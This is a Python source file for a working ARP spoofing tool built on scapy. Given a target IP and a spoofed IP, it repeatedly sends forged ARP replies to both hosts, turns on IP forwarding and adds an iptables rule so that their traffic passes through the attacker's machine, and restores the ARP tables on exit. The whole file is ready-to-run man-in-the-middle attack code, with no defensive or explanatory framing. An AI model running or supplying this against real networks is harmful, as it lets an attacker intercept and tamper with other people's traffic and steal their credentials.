import scapy.all as scapy
import argparse
import time
import subprocess
import os

if os.geteuid() != 0:
    exit("you must be as root user to run this tool, buddy!!!")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="specify your target ip")
    parser.add_argument("-s", "--spoof", dest="spoof", help="specify your spoof ip")
    options = parser.parse_args()

    if not options.target:
        parser.error("specify your target ip")
    elif not options.spoof:
        parser.error("specify your spoof ip")
    else:
        return options

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    source_destination = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_result = source_destination/arp_request
    ans = scapy.srp(arp_result, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

def spoof_packet(target_ip, spoof_ip):
    mac = scan(target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst=mac, op=2, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = scan(dest_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac, op=2)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

send_packet_value = 0
try:

    while True:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.call("iptables -A FORWARD -i ens33 -j ACCEPT", shell=True)
        spoof_packet(options.target, options.spoof)
        spoof_packet(options.spoof, options.target)
        send_packet_value = send_packet_value + 2
        print("\rpacket sent : " + str(send_packet_value), end="")
        time.sleep(2)


except KeyboardInterrupt:
    print("\nQuitting.....Restoring ARP Table.....")
    restore(options.target, options.spoof)
    restore(options.spoof, options.target)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

